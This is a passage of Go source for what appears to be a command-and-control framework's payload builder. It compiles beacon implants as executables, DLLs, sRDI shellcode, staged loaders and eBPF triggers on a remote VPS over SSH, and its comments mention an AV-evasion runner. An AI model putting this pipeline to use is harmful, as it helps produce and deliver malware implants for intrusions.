package server

// gosrc 载荷经 VPS 构建(契约 C2_CONTRACTS.md §14,Agent A)。
//
// 模式:事件驱动的异步作业(与免杀 runner 同款——创建即 launch + 启动恢复 +
// TakeC2Job 的 queued→running CAS 防双跑),消费 c2_jobs 里 kind=build 的行;
// 独立并发闸(与免杀 sem 并列,单并发防拖垮 VPS)。重试仿 report_pipeline 的
// analyzeWithRetry:仅瞬态(SSH 连接/超时类)退避重试,命令自身失败不重试。
//
// 数据流(gosrc zip → VPS 二进制):
//   上传:zip → base64 → 分块(≤48KB 原始字节,远离 argv 128KB 上限)逐块
//        `printf '%s' '<chunk>' >> src.b64` 追加 → `base64 -d` 落回 src.zip;
//   构建:command -v go 探测 → unzip(缺失回落 python3 -m zipfile)→
//        `go build -trimpath -ldflags "-s -w" -o beacon_<id> main.go`(main.go
//        文件模式构建:zip 工程无 go.mod,目录模式会被 module 机制拒收);
//   取回:`dd bs=4M skip=N | base64` 逐块读回拼装 → sha256/size 回填载荷行,
//        built_on_vps=true,下载端点照常。
//
// 铁律:本文件禁 os/exec——对 VPS 的一切操作经 vpscenter.ExecCommandDir(SSH);
// 工作区 <workspace_base>/c2build_<payloadID>/,整个作业 10 分钟超时。

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"
	"path"
	"path/filepath"
	"sort"
	"strings"
	"time"

	c2center "github.com/Autumn-27/artex/c2center"
	pgdb "github.com/Autumn-27/artex/db"
)

// ---- 常量 ----

const (
	// c2BuildUploadChunk 每块上传的原始字节数(base64 后 64KB,单条命令远小于
	// Linux argv 单参数 128KB 上限)。
	c2BuildUploadChunk = 48 << 10
	// c2BuildFetchChunk 每块取回的原始字节数(契约 §14 上限 4MB)。
	c2BuildFetchChunk = 4 << 20
	// c2BuildFetchMaxChunks 取回块数保险丝(4MB×64=256MB,防异常死循环)。
	c2BuildFetchMaxChunks = 64
	// c2BuildJobTimeout 整个作业的时间预算(契约 §14:上限 10 分钟)。
	c2BuildJobTimeout = 10 * time.Minute
	// c2BuildLogTail 构建日志在 job.result 里保留的尾部字节数(契约 §14:2KB)。
	c2BuildLogTail = 2048
	// c2BuildMaxRetries 瞬态错误的额外重试次数(仿 analyzeWithRetry 语义)。
	c2BuildMaxRetries = 2
)

// c2BuildSem 构建作业的全局并发闸(§14:与免杀 runner 并列但独立,单并发)。
var c2BuildSem = make(chan struct{}, 1)

// errC2BuildStep 是「命令自身失败」(非零退出码/语义性失败):确定性错误,重试
// 无意义,必须与 SSH 传输层错误区分——后者才走瞬态重试。包装了命令输出尾部,
// 因此绝不能用关键词匹配判断它。
type errC2BuildStep struct{ msg string }

func (e *errC2BuildStep) Error() string { return e.msg }

// initC2Build 构建作业的启动恢复(initC2 尾部调用):崩溃遗留的 running 拨回
// queued(构建是整体重跑语义:工作区先清后建,产物覆盖),未终态作业重新 launch
// (TakeC2Job CAS 保证不双跑)。
func (s *Server) initC2Build() {
	if s.m == nil || s.m.PG() == nil {
		return
	}
	pg := s.m.PG()
	if n, err := pg.ResetStuckC2Jobs(pgdb.C2JobKindBuild); err != nil {
		log.Printf("[c2-build] 遗留 running 作业拨回失败(下次启动重试): %v", err)
	} else if n > 0 {
		log.Printf("[c2-build] 已把 %d 条遗留 running 构建作业拨回 queued", n)
	}
	jobs, err := pg.ListOpenC2Jobs(pgdb.C2JobKindBuild)
	if err != nil {
		log.Printf("[c2-build] 恢复未终态构建作业失败: %v", err)
		return
	}
	for _, j := range jobs {
		if j.Status == pgdb.C2JobStatusQueued {
			go s.runC2BuildJob(j.ID)
		}
	}
	if len(jobs) > 0 {
		log.Printf("[c2-build] 已恢复 %d 条未终态构建作业", len(jobs))
	}
}

// runC2BuildJob 执行一条构建作业(异步入口):并发闸 → CAS 领取 → 10 分钟预算 →
// 瞬态重试 → 终态回填。重试退避 20s/40s(照 analyzeWithRetry;预算由 ctx 统一封顶)。
func (s *Server) runC2BuildJob(jobID int64) {
	if s.m == nil || s.m.PG() == nil || jobID <= 0 {
		return
	}
	c2BuildSem <- struct{}{}
	defer func() { <-c2BuildSem }()

	pg := s.m.PG()
	ok, err := pg.TakeC2Job(jobID) // queued→running 原子领取;false=已被领走/不在排队态
	if err != nil {
		log.Printf("[c2-build] 领取作业 #%d 失败: %v", jobID, err)
		return
	}
	if !ok {
		return
	}
	job, err := pg.GetC2Job(jobID)
	if err != nil || job == nil {
		if err == nil {
			err = fmt.Errorf("作业 #%d 不存在", jobID)
		}
		_ = pg.FinishC2Job(jobID, pgdb.C2JobStatusError, nil, "作业读取失败: "+err.Error())
		log.Printf("[c2-build] 作业 #%d 读取失败: %v", jobID, err)
		return
	}

	ctx, cancel := context.WithTimeout(s.ctx, c2BuildJobTimeout)
	defer cancel()

	var buildLog []byte
	var buildErr error
	for attempt := 0; ; attempt++ {
		buildLog, buildErr = s.execC2Build(ctx, job)
		if buildErr == nil || ctx.Err() != nil || attempt >= c2BuildMaxRetries || !isTransientBuildError(buildErr) {
			break
		}
		backoff := time.Duration(20*(attempt+1)) * time.Second
		log.Printf("[c2-build] 作业 #%d 瞬态失败(%s),%s 后重试(%d/%d)",
			jobID, firstLineOf(buildErr.Error(), 160), backoff, attempt+1, c2BuildMaxRetries)
		select {
		case <-time.After(backoff):
		case <-ctx.Done():
		}
	}

	if buildErr != nil {
		errText := buildErr.Error()
		if ctx.Err() != nil {
			errText = fmt.Sprintf("构建作业超时(预算 %s): %v", c2BuildJobTimeout, ctx.Err())
		}
		_ = pg.FinishC2Job(jobID, pgdb.C2JobStatusError, buildResultJSON(buildLog), errText)
		log.Printf("[c2-build] 作业 #%d(payload #%d)失败: %s", jobID, job.PayloadID, firstLineOf(errText, 200))
		return
	}
	_ = pg.FinishC2Job(jobID, pgdb.C2JobStatusDone, buildResultJSON(buildLog), "")
	log.Printf("[c2-build] 作业 #%d(payload #%d)完成", jobID, job.PayloadID)
}

// buildResultJSON 把构建日志尾部包成 job.result(失败也带日志,便于排查)。
func buildResultJSON(buildLog []byte) json.RawMessage {
	b, err := json.Marshal(map[string]any{"build_log": c2ClipTail(buildLog, c2BuildLogTail)})
	if err != nil {
		return json.RawMessage("{}")
	}
	return b
}

// nonStepErr 把「确定性失败(errC2BuildStep)」折叠为 nil,其余(SSH 传输层错误)
// 原样透传——探测类原语用它区分「没找到(确定性,给安装提示)」与「会话坏了(可能瞬态)」。
func nonStepErr(err error) error {
	if err == nil {
		return nil
	}
	var step *errC2BuildStep
	if errors.As(err, &step) {
		return nil
	}
	return err
}

// isTransientBuildError 瞬态判定:SSH 连接/超时类才值得重试;命令自身失败
// (errC2BuildStep)与机器不存在等语义错误直接放行快速失败路径。
func isTransientBuildError(err error) bool {
	if err == nil {
		return false
	}
	var step *errC2BuildStep
	if errors.As(err, &step) {
		return false
	}
	msg := strings.ToLower(err.Error())
	for _, kw := range []string{
		"connection reset", "connection refused", "broken pipe", "unexpected eof",
		"no such host", "connection lost", "ssh: disconnect", "handshake", "timeout",
		"timed out", "超时",
	} {
		if strings.Contains(msg, kw) {
			return true
		}
	}
	return false
}

// execC2Build 构建作业分发器(三期 §19 载荷矩阵,Agent P):
//   - job.input 无 artifact(或 script)= 二期 gosrc 构建作业 → execC2BuildLegacy
//     (原 §14 流程原样保留,升级期在途作业零回归);
//   - artifact=ebpf → execC2BuildEbpf(clang 探测,源码资产 c2center.EbpfTriggerAssets);
//   - 其余(exe/dll/shellcode)→ execC2BuildMatrix(含 staged 的「先 stage 后 stager」)。
func (s *Server) execC2Build(ctx context.Context, job *pgdb.C2Job) ([]byte, error) {
	spec := decodeC2BuildSpec(job.Input)
	switch spec.Artifact {
	case "", pgdb.C2PayloadArtifactScript:
		return s.execC2BuildLegacy(ctx, job)
	case pgdb.C2PayloadArtifactEbpf:
		return s.execC2BuildEbpf(ctx, job, spec)
	case pgdb.C2PayloadArtifactExe, pgdb.C2PayloadArtifactDll, pgdb.C2PayloadArtifactShellcode:
		return s.execC2BuildMatrix(ctx, job, spec)
	default:
		return nil, &errC2BuildStep{fmt.Sprintf("构建作业的产物形态非法: %q", spec.Artifact)}
	}
}

// c2BuildSpec 是 c2_jobs.input 的载荷矩阵部分(与 c2BuildJobInput 同构的宽容解析:
// 二期作业的 input 没有 artifact 字段 → 零值走 legacy)。
type c2BuildSpec struct {
	Artifact      string `json:"artifact"`
	Direction     string `json:"direction"`
	Staged        bool   `json:"staged"`
	StageArtifact string `json:"stage_artifact"`
	BindPort      int    `json:"bind_port"`
}

func decodeC2BuildSpec(raw json.RawMessage) c2BuildSpec {
	var spec c2BuildSpec
	_ = json.Unmarshal(raw, &spec) // 空输入/老格式 → 零值(legacy)
	return spec
}

// execC2BuildLegacy 二期 gosrc 构建(§14 原流程,行为不变;三期前升级期在途作业
// 与「gosrc 只出源码包再补建」的路径都走这里)。
func (s *Server) execC2BuildLegacy(ctx context.Context, job *pgdb.C2Job) ([]byte, error) {
	pg := s.m.PG()
	payload, err := pg.GetC2Payload(job.PayloadID)
	if err != nil {
		return nil, err
	}
	if payload == nil {
		return nil, &errC2BuildStep{fmt.Sprintf("载荷 #%d 不存在(数据异常)", job.PayloadID)}
	}
	machine, err := pg.GetVpsMachine(job.VPSMachineID)
	if err != nil {
		return nil, err
	}
	if machine == nil {
		return nil, &errC2BuildStep{fmt.Sprintf("构建机器 #%d 不存在", job.VPSMachineID)}
	}
	vm := VPSManager()
	if vm == nil {
		return nil, &errC2BuildStep{"VPS 中心未初始化,无法执行构建"}
	}
	// 源码包字节(zip 落盘路径由服务端构造;丢失=被清理,确定性失败)。
	if payload.FilePath == "" {
		return nil, &errC2BuildStep{fmt.Sprintf("载荷 #%d 没有源码包文件", payload.ID)}
	}
	zipBytes, err := os.ReadFile(payload.FilePath)
	if err != nil {
		return nil, &errC2BuildStep{fmt.Sprintf("读取源码包失败: %v", err)}
	}
	// 工作区(契约 §14):<workspace_base>/c2build_<payloadID>;workspace_base
	// 录入时校验为绝对路径,统一转 POSIX 斜杠(远端是 Linux)。
	dir := path.Join(filepath.ToSlash(machine.WorkspaceBase), fmt.Sprintf("c2build_%d", payload.ID))
	if !strings.HasPrefix(dir, "/") {
		return nil, &errC2BuildStep{fmt.Sprintf("机器 «%s» 的 workspace_base 非法: %q", machine.Name, machine.WorkspaceBase)}
	}

	var logBuf strings.Builder
	appendLog := func(label string, out []byte) {
		if len(out) > 0 {
			logBuf.WriteString(fmt.Sprintf("$ %s\n%s\n", label, strings.TrimRight(string(out), "\n")))
		}
	}
	// run 跑一条远端命令:传输层错误原样返回(可能瞬态);命令非零退出包成
	// errC2BuildStep(确定性)。每次调用是独立 SSH 会话,状态靠工作区文件接力。
	run := func(label, cmd string, timeout time.Duration) ([]byte, error) {
		out, code, xerr := vm.ExecCommandDir(ctx, machine.ID, dir, "manual", cmd, timeout)
		appendLog(label, out)
		if xerr != nil {
			return out, fmt.Errorf("执行 %s 失败: %w", label, xerr)
		}
		if code != 0 {
			return out, &errC2BuildStep{fmt.Sprintf("%s 失败(退出码 %d): %s", label, code, firstLineOf(string(out), 300))}
		}
		return out, nil
	}

	binName := fmt.Sprintf("beacon_%d", payload.ID)

	// 1) 工作区清场(重试/重复构建幂等)。
	if _, err := run("清场", fmt.Sprintf("rm -f src.b64 src.zip %s main.go BUILD.md", shQuote(binName)), 30*time.Second); err != nil {
		return []byte(logBuf.String()), err
	}
	// 2) 分块上传 base64(逐块追加;块内字符集 [A-Za-z0-9+/=],单引号安全)。
	b64 := base64.StdEncoding.EncodeToString(zipBytes)
	for i, off := 0, 0; off < len(b64); i, off = i+1, off+c2BuildUploadChunk {
		end := off + c2BuildUploadChunk
		if end > len(b64) {
			end = len(b64)
		}
		cmd := fmt.Sprintf("printf '%%s' %s >> src.b64", shQuote(b64[off:end]))
		if _, err := run(fmt.Sprintf("上传分块 %d", i+1), cmd, 60*time.Second); err != nil {
			return []byte(logBuf.String()), err
		}
	}
	// 3) 解码 + 解包(unzip 缺失回落 python3 -m zipfile;两者都无则确定性失败)。
	extract := "base64 -d src.b64 > src.zip && rm -f src.b64 && " +
		"if command -v unzip >/dev/null 2>&1; then unzip -o src.zip; " +
		"else python3 -m zipfile -e src.zip .; fi"
	if _, err := run("解包源码", extract, 120*time.Second); err != nil {
		return []byte(logBuf.String()), err
	}
	// 4) Go 工具链探测(契约 §14:无 go → 明确提示,确定性失败)。
	out, err := run("探测 Go", "command -v go", 30*time.Second)
	if err != nil {
		var step *errC2BuildStep
		if errors.As(err, &step) { // 退出码非零 = 没装;换成面向用户的明确提示
			err = &errC2BuildStep{fmt.Sprintf("机器 «%s»(%s) 未安装 Go 工具链,请先在 VPS 上安装 Go(可用 VPS 工具集一键安装)后重试", machine.Name, machine.Host)}
		}
		return []byte(logBuf.String()), err
	}
	if strings.TrimSpace(string(out)) == "" {
		return []byte(logBuf.String()), &errC2BuildStep{fmt.Sprintf("机器 «%s»(%s) 未安装 Go 工具链,请先在 VPS 上安装 Go(可用 VPS 工具集一键安装)后重试", machine.Name, machine.Host)}
	}
	// 5) 构建:main.go 文件模式(zip 工程无 go.mod);GOOS 按载荷目标换平台
	//(cross=构建机自身平台)。产物 beacon_<payloadID>。
	buildCmd := fmt.Sprintf("go build -trimpath -ldflags \"-s -w\" -o %s main.go", shQuote(binName))
	if goos := c2GoosForTarget(payload.Target); goos != "" {
		buildCmd = "GOOS=" + goos + " " + buildCmd
	}
	if _, err := run("go build", buildCmd, 8*time.Minute); err != nil {
		return []byte(logBuf.String()), err
	}
	// 6) 分块取回产物:dd 按 4MB 切块 | base64,空块即到尾。
	var bin []byte
	for i := 0; i < c2BuildFetchMaxChunks; i++ {
		cmd := fmt.Sprintf("dd if=%s bs=%d skip=%d count=1 2>/dev/null | base64", shQuote(binName), c2BuildFetchChunk, i)
		out, ferr := run(fmt.Sprintf("取回分块 %d", i+1), cmd, 120*time.Second)
		if ferr != nil {
			return []byte(logBuf.String()), ferr
		}
		chunk, derr := base64.StdEncoding.DecodeString(c2StripWS(string(out)))
		if derr != nil {
			return []byte(logBuf.String()), &errC2BuildStep{fmt.Sprintf("取回分块 %d 的 base64 解码失败: %v", i+1, derr)}
		}
		if len(chunk) == 0 {
			break
		}
		bin = append(bin, chunk...)
	}
	if len(bin) == 0 {
		return []byte(logBuf.String()), &errC2BuildStep{"构建产物为空(go build 未产出二进制,查看构建日志)"}
	}
	// 7) 落盘 <BaseDir>/c2/payloads/<id>_beacon_<id>[.exe] 并回填载荷行
	//(sha256/size 换成二进制的值,built_on_vps=true;下载端点照常)。
	sum := sha256.Sum256(bin)
	name := fmt.Sprintf("%d_beacon_%d", payload.ID, payload.ID)
	if payload.Target == "windows" {
		name += ".exe"
	}
	outPath := filepath.Join(c2BlobDir(s.m.dir, "payloads"), sanitizeReportFilename(name))
	if err := os.MkdirAll(filepath.Dir(outPath), 0o755); err != nil {
		return []byte(logBuf.String()), fmt.Errorf("建载荷目录失败: %w", err)
	}
	if err := os.WriteFile(outPath, bin, 0o600); err != nil {
		return []byte(logBuf.String()), fmt.Errorf("写构建产物失败: %w", err)
	}
	if err := pg.UpdateC2PayloadBuildResult(payload.ID, outPath, hex.EncodeToString(sum[:]), int64(len(bin))); err != nil {
		return []byte(logBuf.String()), err
	}
	logBuf.WriteString(fmt.Sprintf("[ok] %s (%d bytes, sha256=%s)\n", filepath.Base(outPath), len(bin), hex.EncodeToString(sum[:])[:16]+"…"))
	return []byte(logBuf.String()), nil
}

// c2ClipTail 截取前 n 字节(job.result 的构建日志尾部上限用)。
func c2ClipTail(b []byte, n int) string {
	if len(b) <= n {
		return string(b)
	}
	return string(b[:n])
}

// c2StripWS 去掉全部空白(base64 命令行输出默认 76 列折行,解码前须拼接)。
func c2StripWS(s string) string {
	return strings.Join(strings.Fields(s), "")
}

// c2GoosForTarget 载荷目标平台 → GOOS(cross 返回空串 = 用构建机自身平台)。
func c2GoosForTarget(target string) string {
	switch target {
	case "windows":
		return "windows"
	case "linux":
		return "linux"
	case "macos":
		return "darwin"
	default:
		return ""
	}
}

// shQuote POSIX 单引号转义(与 vpscenter.shq 同款;server 包不能用其未导出副本)。
func shQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// firstLineOf 取首行并截断(日志输出防刷屏)。
func firstLineOf(s string, n int) string {
	if i := strings.IndexAny(s, "\r\n"); i >= 0 {
		s = s[:i]
	}
	if len(s) > n {
		s = s[:n] + "…"
	}
	return s
}

// ---- 三期:载荷矩阵构建(契约 C2_CONTRACTS.md §19,Agent P)----
//
// 在 §14 管线之上按矩阵扩展:
//   - exe  = go build(常规);
//   - dll  = CGO_ENABLED=1 + -buildmode=c-shared(Windows 交叉需 mingw-w64,
//     探测缺失给明确提示);
//   - shellcode = dll 构建完成后本机 sRDI 转换(c2center.ConvertDLLToShellcode,
//     纯 Go 字节拼装,不 exec);
//   - staged = 先构建完整 stage → 注册 stage blob(payloads/stage_<id>.bin,复用
//     载荷文件存储,契约 §19)→ 清场 → 再构建 stager;
//   - ebpf = clang 探测编译 tc/XDP 触发器(c2center.EbpfTriggerAssets 源码资产)
//     + bind beacon go build,本地打包 zip 回填。
// 构建日志照旧存 job.result.build_log;产物经 UpdateC2PayloadArtifact 回填
// (file_path/sha256/size/built_on_vps/artifact)。

// c2SRDIExportName 是平台产物的固定导出函数(契约 §19:dll/shellcode 导出 Run)。
const c2SRDIExportName = "Run"

// c2ArtifactFileExt 构建产物的下载扩展名(按产物形态与目标平台)。
func c2ArtifactFileExt(artifact, target string) string {
	switch artifact {
	case pgdb.C2PayloadArtifactExe:
		if target == "windows" {
			return ".exe"
		}
		return ""
	case pgdb.C2PayloadArtifactDll:
		if target == "windows" {
			return ".dll"
		}
		return ".so"
	case pgdb.C2PayloadArtifactShellcode:
		return ".bin"
	default:
		return ".zip"
	}
}

// c2VpsBuild 是一次矩阵构建的 VPS 会话封装:同一套 run/上传/取回/构建原语,
// 供 stage 构建、stager 构建与 ebpf 构建复用(与 legacy 流程的命令口径一致)。
type c2VpsBuild struct {
	ctx context.Context
	dir string
	log strings.Builder
	run func(label, cmd string, timeout time.Duration) ([]byte, error)
}

// newC2VpsBuild 装配会话(工作区校验与 legacy 同口径;每次调用是独立 SSH 会话,
// 状态靠工作区文件接力)。返回 nil 表示工作区配置非法(已带原因)。
func newC2VpsBuild(ctx context.Context, machine *pgdb.VpsMachine, payloadID int64) (*c2VpsBuild, string) {
	vm := VPSManager()
	if vm == nil {
		return nil, "VPS 中心未初始化,无法执行构建"
	}
	dir := path.Join(filepath.ToSlash(machine.WorkspaceBase), fmt.Sprintf("c2build_%d", payloadID))
	if !strings.HasPrefix(dir, "/") {
		return nil, fmt.Sprintf("机器 «%s» 的 workspace_base 非法: %q", machine.Name, machine.WorkspaceBase)
	}
	b := &c2VpsBuild{ctx: ctx, dir: dir}
	b.run = func(label, cmd string, timeout time.Duration) ([]byte, error) {
		out, code, xerr := vm.ExecCommandDir(ctx, machine.ID, dir, "manual", cmd, timeout)
		if len(out) > 0 {
			b.log.WriteString(fmt.Sprintf("$ %s\n%s\n", label, strings.TrimRight(string(out), "\n")))
		}
		if xerr != nil {
			return out, fmt.Errorf("执行 %s 失败: %w", label, xerr)
		}
		if code != 0 {
			return out, &errC2BuildStep{fmt.Sprintf("%s 失败(退出码 %d): %s", label, code, firstLineOf(string(out), 300))}
		}
		return out, nil
	}
	return b, ""
}

func (b *c2VpsBuild) logf(format string, args ...any) {
	b.log.WriteString(fmt.Sprintf(format+"\n", args...))
}

func (b *c2VpsBuild) logBytes() []byte { return []byte(b.log.String()) }

// clean 清场(重试/重复构建幂等;glob 前缀只含 [A-Za-z0-9_],无引号注入面)。
func (b *c2VpsBuild) clean(globPrefixes ...string) error {
	names := []string{"src.b64", "src.zip", "main.go", "BUILD.md", "go.mod", "go.sum", "trigger.o", "beacon_bind", "stage_bin", "stage_dll.dll"}
	for _, p := range globPrefixes {
		if p != "" && globSafePrefix(p) {
			names = append(names, p+"*")
		}
	}
	_, err := b.run("清场", "rm -f "+strings.Join(names, " "), 30*time.Second)
	return err
}

// globSafePrefix 只放行 [A-Za-z0-9_] 组成的前缀(进 shell glob,防拼接注入)。
func globSafePrefix(s string) bool {
	for _, c := range s {
		if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || c == '_') {
			return false
		}
	}
	return len(s) > 0
}

// uploadFile 分块上传一个文件(≤48KB 原始字节逐块 printf 追加,与 legacy 同口径)。
func (b *c2VpsBuild) uploadFile(label, remoteName string, content []byte) error {
	if strings.ContainsAny(remoteName, "'\n\r") {
		return &errC2BuildStep{fmt.Sprintf("%s: 远端文件名非法: %q", label, remoteName)}
	}
	b64 := base64.StdEncoding.EncodeToString(content)
	for i, off := 0, 0; off < len(b64); i, off = i+1, off+c2BuildUploadChunk {
		end := off + c2BuildUploadChunk
		if end > len(b64) {
			end = len(b64)
		}
		op := ">"
		if i > 0 {
			op = ">>"
		}
		cmd := fmt.Sprintf("printf '%%s' %s %s %s", shQuote(b64[off:end]), op, shQuote(remoteName+".b64"))
		if _, err := b.run(fmt.Sprintf("%s 分块 %d", label, i+1), cmd, 60*time.Second); err != nil {
			return err
		}
	}
	_, err := b.run(label+" 落盘", fmt.Sprintf("base64 -d %s > %s && rm -f %s",
		shQuote(remoteName+".b64"), shQuote(remoteName), shQuote(remoteName+".b64")), 60*time.Second)
	return err
}

// uploadZipAndExtract 上传源码 zip 并解包(unzip 缺失回落 python3 -m zipfile)。
func (b *c2VpsBuild) uploadZipAndExtract(zipBytes []byte) error {
	if err := b.uploadFile("上传源码", "src.zip", zipBytes); err != nil {
		return err
	}
	extract := "if command -v unzip >/dev/null 2>&1; then unzip -o src.zip; " +
		"else python3 -m zipfile -e src.zip .; fi"
	_, err := b.run("解包源码", extract, 120*time.Second)
	return err
}

// probeGo 探测 Go 工具链(契约:无 go → 明确提示,确定性失败)。
func (b *c2VpsBuild) probeGo(machine *pgdb.VpsMachine) error {
	out, err := b.run("探测 Go", "command -v go", 30*time.Second)
	if err != nil {
		var step *errC2BuildStep
		if errors.As(err, &step) {
			return &errC2BuildStep{fmt.Sprintf("机器 «%s»(%s) 未安装 Go 工具链,请先在 VPS 上安装 Go(可用 VPS 工具集一键安装)后重试", machine.Name, machine.Host)}
		}
		return err
	}
	if strings.TrimSpace(string(out)) == "" {
		return &errC2BuildStep{fmt.Sprintf("机器 «%s»(%s) 未安装 Go 工具链,请先在 VPS 上安装 Go(可用 VPS 工具集一键安装)后重试", machine.Name, machine.Host)}
	}
	return nil
}

// probeCC 探测 C 编译器(c-shared 需要):windows 找 mingw-w64 交叉编译器,
// linux 找本机 gcc/cc。缺失返回确定性失败与安装提示。
func (b *c2VpsBuild) probeCC(machine *pgdb.VpsMachine, goos string) (string, error) {
	if goos == "windows" {
		out, err := b.run("探测 mingw-w64", "command -v x86_64-w64-mingw32-gcc || command -v amd64-mingw32msvc-gcc", 30*time.Second)
		if cerr := nonStepErr(err); cerr != nil {
			return "", cerr
		}
		if cc := firstLineOf(string(out), 200); strings.TrimSpace(cc) != "" {
			return strings.TrimSpace(cc), nil
		}
		return "", &errC2BuildStep{fmt.Sprintf("机器 «%s»(%s) 未安装 mingw-w64(x86_64-w64-mingw32-gcc),Windows DLL 交叉编译需要,请先安装(apt install gcc-mingw-w64-x86-64)后重试", machine.Name, machine.Host)}
	}
	out, err := b.run("探测 C 编译器", "command -v gcc || command -v cc", 30*time.Second)
	if cerr := nonStepErr(err); cerr != nil {
		return "", cerr
	}
	if cc := firstLineOf(string(out), 200); strings.TrimSpace(cc) != "" {
		return strings.TrimSpace(cc), nil
	}
	return "", &errC2BuildStep{fmt.Sprintf("机器 «%s»(%s) 未安装 C 编译器(gcc/cc),c-shared 构建需要,请先安装后重试", machine.Name, machine.Host)}
}

// probeClang 探测 clang 与内核头(eBPF 触发器编译依赖;契约:无则明确报错)。
func (b *c2VpsBuild) probeClang(machine *pgdb.VpsMachine) error {
	out, err := b.run("探测 clang", "command -v clang", 30*time.Second)
	if err != nil || strings.TrimSpace(string(out)) == "" {
		if err != nil {
			var step *errC2BuildStep
			if !errors.As(err, &step) {
				return err
			}
		}
		return &errC2BuildStep{fmt.Sprintf("机器 «%s»(%s) 未安装 clang,eBPF 触发器需要 clang -target bpf 编译,请先安装(apt install clang)后重试", machine.Name, machine.Host)}
	}
	if _, err := b.run("探测内核头", "test -f /usr/include/linux/bpf.h", 30*time.Second); err != nil {
		return &errC2BuildStep{fmt.Sprintf("机器 «%s»(%s) 缺少 /usr/include/linux/bpf.h(linux-libc-dev),eBPF 触发器编译需要,请先安装后重试", machine.Name, machine.Host)}
	}
	return nil
}

// prepareModuleIfNeeded 检测源码是否引用第三方库(kcp 信道):是则在工作区初始化
// 模块并拉取依赖(单文件 go build 解析不了第三方 import;需 VPS 可访问 Go 模块代理)。
func (b *c2VpsBuild) prepareModuleIfNeeded() error {
	out, err := b.run("检测第三方依赖", "grep -q xtaci/kcp-go main.go && echo kcp || true", 30*time.Second)
	if err != nil {
		return err
	}
	if !strings.Contains(string(out), "kcp") {
		return nil
	}
	b.logf("[mod] 源码引用 kcp-go:初始化模块并拉取依赖(需 VPS 可访问 Go 模块代理)")
	if _, err := b.run("go mod init", "go mod init beacon", 60*time.Second); err != nil {
		return err
	}
	if _, err := b.run("go get kcp-go", "go get github.com/xtaci/kcp-go/v5", 5*time.Minute); err != nil {
		return err
	}
	return nil
}

// buildMain go build 常规产物(GOOS 按载荷目标;cross=构建机自身平台)。
func (b *c2VpsBuild) buildMain(goos, outName string) error {
	buildCmd := fmt.Sprintf("go build -trimpath -ldflags \"-s -w\" -o %s main.go", shQuote(outName))
	if goos != "" {
		buildCmd = "GOOS=" + goos + " " + buildCmd
	}
	_, err := b.run("go build", buildCmd, 8*time.Minute)
	return err
}

// buildCShared c-shared 构建(Windows dll / Linux so;GOARCH 固定 amd64)。
func (b *c2VpsBuild) buildCShared(goos, cc, outName string) error {
	buildCmd := fmt.Sprintf("CGO_ENABLED=1 CC=%s GOOS=%s GOARCH=amd64 go build -trimpath -buildmode=c-shared -o %s main.go",
		shQuote(cc), goos, shQuote(outName))
	_, err := b.run("go build(c-shared)", buildCmd, 8*time.Minute)
	return err
}

// fetchFile 分块取回工作区文件(dd | base64,空块即尾;块数保险丝防死循环)。
func (b *c2VpsBuild) fetchFile(remoteName string) ([]byte, error) {
	var bin []byte
	for i := 0; i < c2BuildFetchMaxChunks; i++ {
		cmd := fmt.Sprintf("dd if=%s bs=%d skip=%d count=1 2>/dev/null | base64", shQuote(remoteName), c2BuildFetchChunk, i)
		out, err := b.run(fmt.Sprintf("取回 %s 分块 %d", remoteName, i+1), cmd, 120*time.Second)
		if err != nil {
			return nil, err
		}
		chunk, derr := base64.StdEncoding.DecodeString(c2StripWS(string(out)))
		if derr != nil {
			return nil, &errC2BuildStep{fmt.Sprintf("取回 %s 的 base64 解码失败: %v", remoteName, derr)}
		}
		if len(chunk) == 0 {
			break
		}
		bin = append(bin, chunk...)
	}
	if len(bin) == 0 {
		return nil, &errC2BuildStep{fmt.Sprintf("工作区文件 %s 为空(构建未产出?查看构建日志)", remoteName)}
	}
	return bin, nil
}

// c2MachineForJob 构建作业的机器行(legacy 同口径)。
func (s *Server) c2MachineForJob(job *pgdb.C2Job) (*pgdb.VpsMachine, error) {
	machine, err := s.m.PG().GetVpsMachine(job.VPSMachineID)
	if err != nil {
		return nil, err
	}
	if machine == nil {
		return nil, &errC2BuildStep{fmt.Sprintf("构建机器 #%d 不存在", job.VPSMachineID)}
	}
	return machine, nil
}

// c2PayloadAndV3ForJob 载荷行 + 三期矩阵列(数据异常给确定性错误)。
func (s *Server) c2PayloadAndV3ForJob(job *pgdb.C2Job) (*pgdb.C2Payload, *pgdb.C2PayloadV3, error) {
	payload, err := s.m.PG().GetC2Payload(job.PayloadID)
	if err != nil {
		return nil, nil, err
	}
	if payload == nil {
		return nil, nil, &errC2BuildStep{fmt.Sprintf("载荷 #%d 不存在(数据异常)", job.PayloadID)}
	}
	pv, err := s.m.PG().GetC2PayloadV3(job.PayloadID)
	if err != nil {
		return nil, nil, err
	}
	if pv == nil {
		return nil, nil, &errC2BuildStep{fmt.Sprintf("载荷 #%d 缺少三期矩阵列(数据异常)", job.PayloadID)}
	}
	return payload, pv, nil
}

// c2WriteArtifact 落盘构建产物并回填载荷行(file_path/sha256/size/built_on_vps/artifact)。
func (s *Server) c2WriteArtifact(payloadID int64, artifact, target string, bin []byte) (string, error) {
	name := fmt.Sprintf("%d_%s_%d%s", payloadID, artifact, payloadID, c2ArtifactFileExt(artifact, target))
	outPath := filepath.Join(c2BlobDir(s.m.dir, "payloads"), sanitizeReportFilename(name))
	if err := os.MkdirAll(filepath.Dir(outPath), 0o755); err != nil {
		return "", fmt.Errorf("建载荷目录失败: %w", err)
	}
	if err := os.WriteFile(outPath, bin, 0o600); err != nil {
		return "", fmt.Errorf("写构建产物失败: %w", err)
	}
	sum := sha256.Sum256(bin)
	if err := s.m.PG().UpdateC2PayloadArtifact(payloadID, outPath, hex.EncodeToString(sum[:]), int64(len(bin)), artifact); err != nil {
		return "", err
	}
	return outPath, nil
}

// execC2BuildMatrix exe/dll/shellcode 的矩阵构建。staged 顺序按契约 §19:
// 先构建完整 stage → 注册 stage blob → 清场 → 再构建 stager。
func (s *Server) execC2BuildMatrix(ctx context.Context, job *pgdb.C2Job, spec c2BuildSpec) ([]byte, error) {
	payload, pv, err := s.c2PayloadAndV3ForJob(job)
	if err != nil {
		return nil, err
	}
	machine, err := s.c2MachineForJob(job)
	if err != nil {
		return nil, err
	}
